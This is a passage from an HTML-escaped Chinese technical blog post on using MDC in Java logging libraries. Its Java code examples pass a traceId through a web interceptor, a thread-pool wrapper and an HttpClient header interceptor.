data-w=&quot;1024&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span&gt;来源：https://sourl.cn/WbZ9W8&lt;/span&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;之前有一篇文章简单的介绍过MDC，这次结合具体的案例、生产中的具体问题深入了解一下MDC。&lt;/span&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br mpa-from-tpl=&quot;t&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;MDC 介绍&lt;/p&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;1、简介：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;span/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;MDC（Mapped Diagnostic Context，映射调试上下文）是 &lt;/span&gt;&lt;span&gt;&lt;strong&gt;log4j&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; 、&lt;/span&gt;&lt;span&gt;&lt;strong&gt;logback&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;及&lt;/span&gt;&lt;span&gt;&lt;strong&gt;log4j2&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; 提供的一种方便在多线程条件下记录日志的功能。&lt;/span&gt;&lt;span&gt;&lt;strong&gt;MDC &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;可以看成是一个&lt;/span&gt;&lt;span&gt;&lt;strong&gt;与当前线程绑定的哈希表&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;，可以往其中添加键值对。MDC 中包含的内容可以&lt;/span&gt;&lt;span&gt;&lt;strong&gt;被同一线程中执行的代码所访问&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;当前线程的子线程会继承其父线程中的 MDC 的内容。当需要记录日志时，只需要从 MDC 中获取所需的信息即可。MDC 的内容则由程序在适当的时候保存进去。对于一个 Web 应用来说，通常是在请求被处理的最开始保存这些数据。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;2、API说明：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;clear() ：移除所有MDC&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;get (String key) ：获取当前线程MDC中指定key的值&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;getContext() ：获取当前线程MDC的MDC&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;put(String key, Object o) ：往当前线程的MDC中存入指定的键值对&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;remove(String key) ：删除当前线程MDC中指定的键值对&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;3、优点：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;section&gt;&lt;span&gt;代码简洁，日志风格统一，不需要在log打印中手动拼写&lt;/span&gt;&lt;strong&gt;&lt;span&gt;traceId&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;，即&lt;/span&gt;&lt;span&gt;&lt;strong&gt;LOGGER.info(&quot;traceId:{} &quot;, traceId)。&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br mpa-from-tpl=&quot;t&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;MDC 使用&lt;/p&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;1、添加拦截器&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;LogInterceptor&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;HandlerInterceptor&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; &lt;span&gt;preHandle&lt;/span&gt;&lt;span&gt;(HttpServletRequest request, HttpServletResponse response, Object handler)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;//如果有上层调用就用上层的ID&lt;/span&gt;&lt;br/&gt;        String traceId = request.getHeader(Constants.TRACE_ID);&lt;br/&gt;        &lt;span&gt;if&lt;/span&gt; (traceId == &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;            traceId = TraceIdUtil.getTraceId();&lt;br/&gt;        }&lt;br/&gt;&lt;br/&gt;        MDC.put(Constants.TRACE_ID, traceId);&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;;&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;postHandle&lt;/span&gt;&lt;span&gt;(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)&lt;/span&gt;&lt;br/&gt;            &lt;span&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;afterCompletion&lt;/span&gt;&lt;span&gt;(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)&lt;/span&gt;&lt;br/&gt;            &lt;span&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;//调用结束后删除&lt;/span&gt;&lt;br/&gt;        MDC.remove(Constants.TRACE_ID);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;2、修改日志格式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;&amp;lt;&lt;span&gt;property&lt;/span&gt; &lt;span&gt;name&lt;/span&gt;=&lt;span&gt;&quot;pattern&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;[TRACEID:%X{traceId}] %d{HH:mm:ss.SSS} %-5level %class{-1}.%M()/%L - %msg%xEx%n&lt;span&gt;&amp;lt;/&lt;span&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;重点是&lt;/span&gt;&lt;strong&gt;&lt;span&gt;%X{traceId}&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;&lt;strong&gt;traceId&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;和MDC中的键名称一致&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;简单使用就这么容易，但是在有些情况下&lt;/span&gt;&lt;span&gt;&lt;strong&gt;traceId&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;将获取不到。&lt;/span&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br mpa-from-tpl=&quot;t&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;MDC 存在的问题&lt;/p&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;子线程中打印日志丢失traceId&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;HTTP调用丢失traceId&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;丢失traceId的情况，来一个再解决一个，绝不提前优化。&lt;/span&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br mpa-from-tpl=&quot;t&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;解决 MDC 存在的问题&lt;/p&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;子线程日志打印丢失traceId&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;子线程在打印日志的过程中traceId将丢失，解决方式为重写线程池，对于直接new创建线程的情况不考略【实际应用中应该避免这种用法】，重写线程池无非是对任务进行一次封装。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;线程池封装类：ThreadPoolExecutorMdcWrapper.java&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ThreadPoolExecutorMdcWrapper&lt;/span&gt; &lt;span&gt;extends&lt;/span&gt; &lt;span&gt;ThreadPoolExecutor&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;ThreadPoolExecutorMdcWrapper&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; corePoolSize, &lt;span&gt;int&lt;/span&gt; maximumPoolSize, &lt;span&gt;long&lt;/span&gt; keepAliveTime, TimeUnit unit,&lt;br/&gt;                                        BlockingQueue&amp;lt;Runnable&amp;gt; workQueue)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;super&lt;/span&gt;(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;ThreadPoolExecutorMdcWrapper&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; corePoolSize, &lt;span&gt;int&lt;/span&gt; maximumPoolSize, &lt;span&gt;long&lt;/span&gt; keepAliveTime, TimeUnit unit,&lt;br/&gt;                                        BlockingQueue&amp;lt;Runnable&amp;gt; workQueue, ThreadFactory threadFactory)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;super&lt;/span&gt;(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;ThreadPoolExecutorMdcWrapper&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; corePoolSize, &lt;span&gt;int&lt;/span&gt; maximumPoolSize, &lt;span&gt;long&lt;/span&gt; keepAliveTime, TimeUnit unit,&lt;br/&gt;                                        BlockingQueue&amp;lt;Runnable&amp;gt; workQueue, RejectedExecutionHandler handler)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;super&lt;/span&gt;(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, handler);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;ThreadPoolExecutorMdcWrapper&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; corePoolSize, &lt;span&gt;int&lt;/span&gt; maximumPoolSize, &lt;span&gt;long&lt;/span&gt; keepAliveTime, TimeUnit unit,&lt;br/&gt;                                        BlockingQueue&amp;lt;Runnable&amp;gt; workQueue, ThreadFactory threadFactory,&lt;br/&gt;                                        RejectedExecutionHandler handler)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;super&lt;/span&gt;(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;execute&lt;/span&gt;&lt;span&gt;(Runnable task)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;super&lt;/span&gt;.execute(ThreadMdcUtil.wrap(task, MDC.getCopyOfContextMap()));&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span&gt;Future&amp;lt;T&amp;gt; &lt;span&gt;submit&lt;/span&gt;&lt;span&gt;(Runnable task, T result)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;.submit(ThreadMdcUtil.wrap(task, MDC.getCopyOfContextMap()), result);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span&gt;Future&amp;lt;T&amp;gt; &lt;span&gt;submit&lt;/span&gt;&lt;span&gt;(Callable&amp;lt;T&amp;gt; task)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;.submit(ThreadMdcUtil.wrap(task, MDC.getCopyOfContextMap()));&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; Future&amp;lt;?&amp;gt; submit(Runnable task) {&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;.submit(ThreadMdcUtil.wrap(task, MDC.getCopyOfContextMap()));&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;说明：&lt;/span&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;继承&lt;/span&gt;&lt;strong&gt;&lt;span&gt;ThreadPoolExecutor&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;类，重新执行任务的方法&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;通过&lt;/span&gt;&lt;span&gt;&lt;strong&gt;ThreadMdcUtil&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;对任务进行一次包装&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;线程traceId封装工具类：ThreadMdcUtil.java&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ThreadMdcUtil&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;setTraceIdIfAbsent&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;if&lt;/span&gt; (MDC.get(Constants.TRACE_ID) == &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;            MDC.put(Constants.TRACE_ID, TraceIdUtil.getTraceId());&lt;br/&gt;        }&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span&gt;Callable&amp;lt;T&amp;gt; &lt;span&gt;wrap&lt;/span&gt;&lt;span&gt;(&lt;span&gt;final&lt;/span&gt; Callable&amp;lt;T&amp;gt; callable, &lt;span&gt;final&lt;/span&gt; Map&amp;lt;String, String&amp;gt; context)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; () -&amp;gt; {&lt;br/&gt;            &lt;span&gt;if&lt;/span&gt; (context == &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;                MDC.clear();&lt;br/&gt;            } &lt;span&gt;else&lt;/span&gt; {&lt;br/&gt;                MDC.setContextMap(context);&lt;br/&gt;            }&lt;br/&gt;            setTraceIdIfAbsent();&lt;br/&gt;            &lt;span&gt;try&lt;/span&gt; {&lt;br/&gt;                &lt;span&gt;return&lt;/span&gt; callable.call();&lt;br/&gt;            } &lt;span&gt;finally&lt;/span&gt; {&lt;br/&gt;                MDC.clear();&lt;br/&gt;            }&lt;br/&gt;        };&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Runnable &lt;span&gt;wrap&lt;/span&gt;&lt;span&gt;(&lt;span&gt;final&lt;/span&gt; Runnable runnable, &lt;span&gt;final&lt;/span&gt; Map&amp;lt;String, String&amp;gt; context)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; () -&amp;gt; {&lt;br/&gt;            &lt;span&gt;if&lt;/span&gt; (context == &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;                MDC.clear();&lt;br/&gt;            } &lt;span&gt;else&lt;/span&gt; {&lt;br/&gt;                MDC.setContextMap(context);&lt;br/&gt;            }&lt;br/&gt;            setTraceIdIfAbsent();&lt;br/&gt;            &lt;span&gt;try&lt;/span&gt; {&lt;br/&gt;                runnable.run();&lt;br/&gt;            } &lt;span&gt;finally&lt;/span&gt; {&lt;br/&gt;                MDC.clear();&lt;br/&gt;            }&lt;br/&gt;        };&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;说明【&lt;/span&gt;&lt;strong&gt;&lt;span&gt;以封装Runnable为例&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;】：&lt;/span&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;判断当前线程对应MDC的Map是否存在，存在则设置&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;设置MDC中的traceId值，不存在则新生成，针对不是子线程的情况，如果是子线程，MDC中traceId不为null&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;执行run方法&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;代码等同于以下写法，会更直观&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Runnable &lt;span&gt;wrap&lt;/span&gt;&lt;span&gt;(&lt;span&gt;final&lt;/span&gt; Runnable runnable, &lt;span&gt;final&lt;/span&gt; Map&amp;lt;String, String&amp;gt; context)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Runnable() {&lt;br/&gt;            &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;            &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;run&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;                &lt;span&gt;if&lt;/span&gt; (context == &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;                    MDC.clear();&lt;br/&gt;                } &lt;span&gt;else&lt;/span&gt; {&lt;br/&gt;                    MDC.setContextMap(context);&lt;br/&gt;                }&lt;br/&gt;                setTraceIdIfAbsent();&lt;br/&gt;                &lt;span&gt;try&lt;/span&gt; {&lt;br/&gt;                    runnable.run();&lt;br/&gt;                } &lt;span&gt;finally&lt;/span&gt; {&lt;br/&gt;                    MDC.clear();&lt;br/&gt;                }&lt;br/&gt;            }&lt;br/&gt;        };&lt;br/&gt;    }&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;重新返回的是包装后的Runnable，在该任务执行之前【&lt;/span&gt;&lt;span&gt;&lt;strong&gt;runnable.run()&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;】先将主线程的Map设置到当前线程中【 即&lt;/span&gt;&lt;span&gt;&lt;strong&gt;MDC.setContextMap(context)&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;】，这样子线程和主线程MDC对应的Map就是一样的了。&lt;/span&gt;&lt;/p&gt;&lt;section&gt;&lt;strong&gt;HTTP调用丢失traceId&lt;/strong&gt;&lt;br/&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;在使用HTTP调用第三方服务接口时traceId将丢失，需要对HTTP调用工具进行改造，在发送时在request header中添加traceId，在下层被调用方添加拦截器获取header中的traceId添加到MDC中。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;HTTP调用有多种方式，比较常见的有&lt;/span&gt;&lt;span&gt;&lt;strong&gt;HttpClient&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;&lt;strong&gt;OKHttp&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;&lt;strong&gt;RestTemplate&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;，所以只给出这几种HTTP调用的解决方式。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;&lt;strong&gt;1、HttpClient：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;实现HttpClient拦截器：&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;HttpClientTraceIdInterceptor&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;HttpRequestInterceptor&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;process&lt;/span&gt;&lt;span&gt;(HttpRequest httpRequest, HttpContext httpContext)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; HttpException, IOException &lt;/span&gt;{&lt;br/&gt;        String traceId = MDC.get(Constants.TRACE_ID);&lt;br/&gt;        &lt;span&gt;//当前线程调用中有traceId，则将该traceId进行透传&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;if&lt;/span&gt; (traceId != &lt;span&gt;null&lt;/span&gt;) {&lt;br/&gt;            &lt;span&gt;//添加请求体&lt;/span&gt;&lt;br/&gt;            httpRequest.addHeader(Constants.TRACE_ID, traceId);&lt;br/&gt;        }&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;实现&lt;/span&gt;&lt;span&gt;&lt;strong&gt;HttpRequestInterceptor&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;接口并重写process方法&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;如果调用线程中含有traceId，则需要将获取到的traceId通过request中的header向下透传下去。&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;为&lt;/span&gt;&lt;span&gt;&lt;strong&gt;HttpClient&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;添加拦截器：&lt;/span&gt;&lt;/p&gt;&lt;pre 